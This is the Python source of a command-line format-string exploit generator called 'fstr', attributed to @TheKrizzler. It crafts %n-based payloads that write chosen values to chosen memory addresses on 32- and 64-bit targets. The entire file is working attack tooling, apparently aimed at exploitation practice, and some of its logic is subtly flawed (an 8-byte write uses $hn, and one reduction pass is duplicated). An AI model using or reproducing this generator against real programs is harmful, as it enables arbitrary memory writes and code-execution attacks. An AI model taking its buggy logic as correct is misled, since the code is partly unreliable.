from colorama import Fore, Style
import argparse

class FormatString64:
	def __init__(self,writes: dict,offset=1,append='',max_write=0):
		self.writes = writes
		#self.prepend = prepend.encode()
		self.append = append.encode()
		self.offset = offset
		self.max_write = max_write # 0 means no limit
		self.formatString = b''
		self.padding = 0

	def unnecessaryHeader():
		print(Fore.CYAN+Style.BRIGHT+'  __       _         ')
		print(Fore.CYAN+Style.NORMAL+' / _|     | |        ')
		print(Fore.CYAN+Style.DIM+'| |_  ___ | |_  _ __ ')
		print(Fore.GREEN+Style.DIM+'|  _|/ __|| __|| \'__|')
		print(Fore.GREEN+Style.NORMAL+'| |  \\__ \\| |_ | |   ')
		print(Fore.GREEN+Style.BRIGHT+'|_|  |___/ \\__||_|   '+Fore.RESET+Style.RESET_ALL)
		print(Fore.GREEN+Style.BRIGHT+'by @TheKrizzler'+Fore.RESET+Style.RESET_ALL)

	def info(self,info):
		print(f'[{Fore.BLUE}*{Fore.RESET}] {info}')

	def debug(self,info):
		print(f'[{Fore.RED}DEBUG{Fore.RESET}] {info}')

	def error(self,info):
		print(f'[{Fore.RED}ERROR{Fore.RESET}] {info}')

	def _createFormatString(self):
		# We split the format string into three parts: format specifiers, padding, and addresses.

		# Define addresses
		# Each address is split into 4 separate addresses for each word of the desired 64-bit region
		parsedWrites = self._parseDictToList(self.writes)
		splitWrites = self._splitWrites(parsedWrites) # Split AND optimized!
		addresses = b''
		for address,data,size in splitWrites:
			addresses += self._intToPointer64(address)

		# Handle all format specifiers
		formatSpecifiers = self._createFormatSpecifiers(splitWrites)

		# Handle padding and offsets
		#
		# This part was difficult because the amount of digits in each format specifier changes the total length.
		# This means i had to set a limitation at three digits, meaning no offset can be higher than 999.
		# For example, %1337x%999$hn
		#
		# This should not be a problem for most use cases, but it can be patched to a higher number if needed.
		finalBString = self._craftFinalString(formatSpecifiers,addresses) + self.append

		return finalBString

	def craft(self):
		self.formatString = self._createFormatString()
		self.info(self.formatString)
		self.info(f'Length: {len(self.formatString)}')
		return self.formatString

	def _parseDictToList(self,dictionary):
		finalList = []
		for address,data in dictionary.items():
			finalList.append((address,data))
		return finalList

	def _intToPointer64(self,num) -> bytes:
		pointer = hex(num)[2:]
		if len(pointer) % 2 == 1:
			pointer = '0'+pointer
		pointer = bytes.fromhex(pointer)[::-1].ljust(8,b'\0')
		return pointer

	# Splits one write into four writes or less, based on values to write
	def _splitWrites(self,tuples):
		initialList = []
		firstOptList = []
		secondOptList = []
		thirdOptList = []
		finalList = []
		# Split in four
		for entry in tuples:
			for i in range(4):
				initialList.append((entry[0]+(i*2),(entry[1] >> (16*i)) & 0xFFFF,2))
		# Check for consecutive null-byte writes for optimization
		for index in range(0,len(initialList)-1,2):
			if initialList[index+1][0] - initialList[index][0] == 2 and initialList[index][1] + initialList[index+1][1] == 0:
				firstOptList.append((initialList[index][0],initialList[index][1],4))
			else:
				firstOptList.append((initialList[index][0],initialList[index][1],2))
				firstOptList.append((initialList[index+1][0],initialList[index+1][1],2))
		# Half write sizes (quad word, double word, word, byte) until optimized
		finalList = firstOptList
		if self.max_write:
			# Optimize and split
			for index in range(0,len(firstOptList)):
				if firstOptList[index][1] > self.max_write:
					address,data,size = firstOptList[index]
					splitData = self._splitData(data,size)
					secondOptList.append((address,splitData[0],size//2))
					secondOptList.append((address+(size//2),splitData[1],size//2))
				else:
					address,data,size = firstOptList[index]
					secondOptList.append((address,data,size))
			finalList = secondOptList
		# Finally reduce null-byte writes
		sortedList = sorted(finalList, key=lambda x:x[0])
		for index,entry in enumerate(sortedList[:-1]):
			address,data,size = entry
			if data == 0 and sortedList[index+1][0] - address == 2 and sortedList[index+1][2] == 2:
				thirdOptList.append((address,sortedList[index+1][1],size*2))
			else:
				thirdOptList.append((address,data,size))
		finalList = thirdOptList
		# Finally reduce null-byte writes
		sortedList = sorted(finalList, key=lambda x:x[0])
		done = False
		i = 0
		while not done:
			address,data,size = sortedList[i]
			if sortedList[i+1][1] == 0 and sortedList[i+1][0] - address == 2 and sortedList[i+1][2] == 2 and size == 2:
				thirdOptList.append((address,data,size*2))
				i += 1
			else:
				thirdOptList.append((address,data,size))
			i += 1
			if i >= len(sortedList)-1:
				try:
					thirdOptList.append((sortedList[i][0],sortedList[i][1],sortedList[i][2]))
					done = True
				except:
					done = True
		finalList = thirdOptList
		# Sort and return
		return sorted(finalList,key=lambda x: x[1])

	# This function relies on the 'writes' parameter being sorted by index 1 in each element.
	def _createFormatSpecifiers(self,writes):
		totalWritten = 0
		formatSpecifiers = b''
		prependIsAdded = False
		for address,data,size in writes:
			if data == 0:
				match size:
					case 1:
						formatSpecifiers += b'%#NUM#$hhn'
					case 2:
						formatSpecifiers += b'%#NUM#$hn'
					case 4:
						formatSpecifiers += b'%#NUM#$n'
					case 8:
						formatSpecifiers += b'%#NUM#$ln'
			else:
				if data - totalWritten != 0:
					match size:
						case 1:
							formatSpecifiers += b'%' + str(data - totalWritten).encode() + b'x%#NUM#$hhn'
						case 2:
							formatSpecifiers += b'%' + str(data - totalWritten).encode() + b'x%#NUM#$hn'
						case 4:
							formatSpecifiers += b'%' + str(data - totalWritten).encode() + b'x%#NUM#$n'
						case 8:
							formatSpecifiers += b'%' + str(data - totalWritten).encode() + b'x%#NUM#$hn'
					totalWritten += (data - totalWritten)
				else:
					match size:
						case 1:
							formatSpecifiers += b'%#NUM#$hhn'
						case 2:
							formatSpecifiers += b'%#NUM#$hn'
						case 4:
							formatSpecifiers += b'%#NUM#$n'
						case 8:
							formatSpecifiers += b'%#NUM#$ln'
	
		return formatSpecifiers

	def _craftFinalString(self,formatSpecifiers,addresses):
		initialFmtSpLength = len(formatSpecifiers.replace(b'#NUM#',b''))
		maxOffsetLength = len(addresses)//8*3	# Change the multiple here to increase max offset
		maxFmtSpLength = initialFmtSpLength + maxOffsetLength
		self.padding = 8 - maxFmtSpLength%8

		# Padding and offsets
		offsets = [i+(maxFmtSpLength+self.padding)//8 for i in range(self.offset,self.offset+len(addresses)//8)]
		offsetDigitsLength = self._strlenOfIntList(offsets)
		self.padding += maxOffsetLength - offsetDigitsLength

		# Optimize by reducing padding and offsets
		if self.padding >= 8:
			for index,entry in enumerate(offsets):
				offsets[index] -= self.padding//8
			newDigitsLength = self._strlenOfIntList(offsets)

			self.padding %= 8
			self.padding += offsetDigitsLength - newDigitsLength

		finalBString = self._formatBytestring(formatSpecifiers,offsets) + b'.'*self.padding + addresses
		return finalBString

	def _formatBytestring(self,bytestring,offsetList):
		i = 0
		listIndex = 0
		newBytestring = b''
		# Idk why i kept this error handling. I don't think it will ever be triggered
		if len(offsetList) != bytestring.count(b'#NUM#'):
			self.error(f'Length of offsetList does not match amount of writes')
			self.debug(f'{offsetList=},{bytestring.count(b"#NUM#")=}')
		while i < len(bytestring):
			if bytestring[i:i+5] == b'#NUM#':
				newBytestring += str(offsetList[listIndex]).encode()
				i += 5
				listIndex += 1
			else:
				newBytestring += bytes([bytestring[i]])
				i += 1
		return newBytestring
	
	def _strlenOfIntList(self,intList):
		strlen = 0
		for num in intList:
			strlen += len(str(num))
		return strlen

	def _splitData(self,num,length):
		splitData = []
		match length:
			case 2:
				splitData.append(num & 0xFF)
				splitData.append((num >> 8) & 0xFF)
			case 4:
				splitData.append(num & 0xFFFF)
				splitData.append((num >> 16) & 0xFFFF)
		return splitData

class FormatString32:
	def __init__(self,writes: dict,offset=0,append='',max_write=0):
		self.writes = writes
		#self.prepend = prepend.encode()
		self.append = append.encode()
		self.offset = offset
		self.max_write = max_write # 0 means no limit
		self.formatString = b''
		self.padding = 0

	def unnecessaryHeader():
		print(Fore.CYAN+Style.BRIGHT+'  __       _         ')
		print(Fore.CYAN+Style.NORMAL+' / _|     | |        ')
		print(Fore.CYAN+Style.DIM+'| |_  ___ | |_  _ __ ')
		print(Fore.GREEN+Style.DIM+'|  _|/ __|| __|| \'__|')
		print(Fore.GREEN+Style.NORMAL+'| |  \\__ \\| |_ | |   ')
		print(Fore.GREEN+Style.BRIGHT+'|_|  |___/ \\__||_|   '+Fore.RESET+Style.RESET_ALL)
		print(Fore.GREEN+Style.BRIGHT+'by @TheKrizzler'+Fore.RESET+Style.RESET_ALL)

	def info(self,info):
		print(f'[{Fore.BLUE}*{Fore.RESET}] {info}')

	def debug(self,info):
		print(f'[{Fore.RED}DEBUG{Fore.RESET}] {info}')

	def error(self,info):
		print(f'[{Fore.RED}ERROR{Fore.RESET}] {info}')

	def _createFormatString(self):
		# We split the format string into three parts: format specifiers, padding, and addresses.

		# Define addresses
		# Each address is split into 2 separate addresses for each word of the desired 32-bit region
		parsedWrites = self._parseDictToList(self.writes)
		splitWrites = self._splitWrites(parsedWrites)
		addresses = b''
		for address,data,size in splitWrites:
			addresses += self._intToPointer32(address)

		# Handle all format specifiers
		formatSpecifiers = self._createFormatSpecifiers(splitWrites)

		# Handle padding and offsets
		#
		# This part was difficult because the amount of digits in each format specifier changes the total length.
		# This means i had to set a limitation at three digits, meaning no offset can be higher than 999.
		# For example, %1337x%999$hn
		#
		# This should not be a problem for most use cases, but it can be patched to a higher number if needed.
		finalBString = self._craftFinalString(formatSpecifiers,addresses) + self.append

		return finalBString

	def craft(self):
		self.formatString = self._createFormatString()
		self.info(self.formatString)
		self.info(f'Length: {len(self.formatString)}')
		return self.formatString

	def _parseDictToList(self,dictionary):
		finalList = []
		for address,data in dictionary.items():
			finalList.append((address,data))
		return finalList

	def _intToPointer32(self,num) -> bytes:
		pointer = hex(num)[2:]
		if len(pointer) % 2 == 1:
			pointer = '0'+pointer
		pointer = bytes.fromhex(pointer)[::-1].ljust(4,b'\0')
		return pointer

	# Splits one write into four writes or less, based on values to write
	def _splitWrites(self,tuples):
		initialList = []
		firstOptList = []
		secondOptList = []
		thirdOptList = []
		finalList = []
		# Split in four
		for entry in tuples:
			for i in range(2):
				initialList.append((entry[0]+(i*2),(entry[1] >> (16*i)) & 0xFFFF,2))
		# Check for consecutive null-byte writes for optimization
		# This is more relevant for the 64-bit class, but i still left it in just in case
		for index in range(0,len(initialList)-1,2):
			if initialList[index+1][0] - initialList[index][0] == 2 and initialList[index][1] + initialList[index+1][1] == 0:
				firstOptList.append((initialList[index][0],initialList[index][1],4))
			else:
				firstOptList.append((initialList[index][0],initialList[index][1],2))
				firstOptList.append((initialList[index+1][0],initialList[index+1][1],2))
		finalList = firstOptList
		if self.max_write:
			# Optimize and split
			for index in range(0,len(firstOptList)):
				if firstOptList[index][1] > self.max_write:
					address,data,size = firstOptList[index]
					splitData = self._splitData(data,size)
					secondOptList.append((address,splitData[0],size//2))
					secondOptList.append((address+(size//2),splitData[1],size//2))
				else:
					secondOptList.append((firstOptList[index][0],firstOptList[index][1],firstOptList[index][2]))
			finalList = secondOptList
		# Finally reduce null-byte writes
		sortedList = sorted(finalList, key=lambda x:x[0])
		done = False
		i = 0
		while not done:
			address,data,size = sortedList[i]
			if sortedList[i+1][1] == 0 and sortedList[i+1][0] - address == 2 and sortedList[i+1][2] == 2 and size == 2:
				thirdOptList.append((address,data,size*2))
				i += 1
			else:
				thirdOptList.append((address,data,size))
			i += 1
			if i >= len(sortedList)-1:
				try:
					thirdOptList.append((sortedList[i][0],sortedList[i][1],sortedList[i][2]))
					done = True
				except:
					done = True
		finalList = thirdOptList
		return sorted(finalList,key=lambda x: x[1])

	# This function relies on the 'writes' parameter being sorted by index 1 in each element
	def _createFormatSpecifiers(self,writes):
		totalWritten = 0
		formatSpecifiers = b''
		for address,data,size in writes:
			if data == 0:
				match size:
					case 1:
						formatSpecifiers += b'%#NUM#$hhn'
					case 2:
						formatSpecifiers += b'%#NUM#$hn'
					case 4:
						formatSpecifiers += b'%#NUM#$n'
					case 8:
						formatSpecifiers += b'%#NUM#$ln'
			else:
				if data - totalWritten != 0:
					match size:
						case 1:
							formatSpecifiers += b'%' + str(data - totalWritten).encode() + b'x%#NUM#$hhn'
						case 2:
							formatSpecifiers += b'%' + str(data - totalWritten).encode() + b'x%#NUM#$hn'
						case 4:
							formatSpecifiers += b'%' + str(data - totalWritten).encode() + b'x%#NUM#$n'
						case 8:
							formatSpecifiers += b'%' + str(data - totalWritten).encode() + b'x%#NUM#$hn'
					totalWritten += (data - totalWritten)
				else:
					match size:
						case 1:
							formatSpecifiers += b'%#NUM#$hhn'
						case 2:
							formatSpecifiers += b'%#NUM#$hn'
						case 4:
							formatSpecifiers += b'%#NUM#$n'
						case 8:
							formatSpecifiers += b'%#NUM#$ln'
		return formatSpecifiers

	def _craftFinalString(self,formatSpecifiers,addresses):
		initialFmtSpLength = len(formatSpecifiers.replace(b'#NUM#',b''))
		maxOffsetLength = len(addresses)//4*3	# Change the multiple here to increase max offset
		maxFmtSpLength = initialFmtSpLength + maxOffsetLength
		self.padding = 4 - maxFmtSpLength%4

		# Padding and offsets
		offsets = [i+(maxFmtSpLength+self.padding)//4 for i in range(self.offset,self.offset+len(addresses)//4)]
		offsetDigitsLength = self._strlenOfIntList(offsets)
		self.padding += maxOffsetLength - offsetDigitsLength

		# Optimize by reducing padding and offsets
		if self.padding >= 4:
			for index,entry in enumerate(offsets):
				offsets[index] -= self.padding//4
			newDigitsLength = self._strlenOfIntList(offsets)

			self.padding %= 4
			self.padding += offsetDigitsLength - newDigitsLength

		finalBString = self._formatBytestring(formatSpecifiers,offsets) + b'.'*self.padding + addresses
		return finalBString

	def _formatBytestring(self,bytestring,offsetList):
		i = 0
		listIndex = 0
		newBytestring = b''
		# Idk why i kept this error handling. I don't think it will ever be triggered
		if len(offsetList) != bytestring.count(b'#NUM#'):
			self.error(f'Length of offsetList does not match amount of writes')
			self.debug(f'{offsetList=},{bytestring.count(b"#NUM#")=}')
		while i < len(bytestring):
			if bytestring[i:i+5] == b'#NUM#':
				newBytestring += str(offsetList[listIndex]).encode()
				i += 5
				listIndex += 1
			else:
				newBytestring += bytes([bytestring[i]])
				i += 1
		return newBytestring
	
	def _strlenOfIntList(self,intList):
		strlen = 0
		for num in intList:
			strlen += len(str(num))
		return strlen
	
	def _splitData(self,num,length):
		splitData = []
		match length:
			case 2:
				splitData.append(num & 0xFF)
				splitData.append((num >> 8) & 0xFF)
			case 4:
				splitData.append(num & 0xFFFF)
				splitData.append((num >> 16) & 0xFFFF)
		return splitData

def main():
	# Handle cli use
	argParser = argparse.ArgumentParser('fstr')
	argParser.add_argument('-w','--write',action='append',required=True,help=f'{Style.BRIGHT}REQUIRED{Style.RESET_ALL} - Specify a single address:data pair in hex, i.e 0x404000:0x1337. Can be used multiple times.',type=str)
	argParser.add_argument('--arch',choices=['32','64'],required=True,help=f'{Style.BRIGHT}REQUIRED{Style.RESET_ALL} - Specify either 32-bit or 64-bit architecture')
	argParser.add_argument('-o','--offset',default=0,help='Specify the offset at which your input is found using a format string vulnerability',type=int)
	argParser.add_argument('-m','--max',default=0,help='Specify a maximum amount of bytes each format specifier can write. (use this if the payload is crashing your terminal)',type=int)
	#argParser.add_argument('-p','--prepend',default='',help='Specify a string to prepend to the payload',type=str)
	argParser.add_argument('-a','--append',default='',help='Specify a string to append to the payload',type=str)
	argParser.add_argument('-r','--raw',action='store_true',help='Outputs the only final payload as raw bytes.')
	args = vars(argParser.parse_args())

	writes = parseWrites(args['write'])
	if args['arch'] == '32':
		FormatString64.unnecessaryHeader()
		fmtstr = FormatString32(writes=writes,max_write=args['max'],append=args['append'],offset=args['offset'])
	elif args['arch'] == '64':
		FormatString32.unnecessaryHeader()
		fmtstr = FormatString64(writes=writes,max_write=args['max'],append=args['append'],offset=args['offset'])
	
	if args['raw']:
		print(fmtstr._createFormatString().decode())
	else:
		fmtstr.craft()

def parseWrites(writes):
    writesDict = {}
    for write in writes:
        address, data = write.split(":")
        writesDict[int(address, 16)] = int(data,16)
    return writesDict

if __name__ == '__main__':
	main()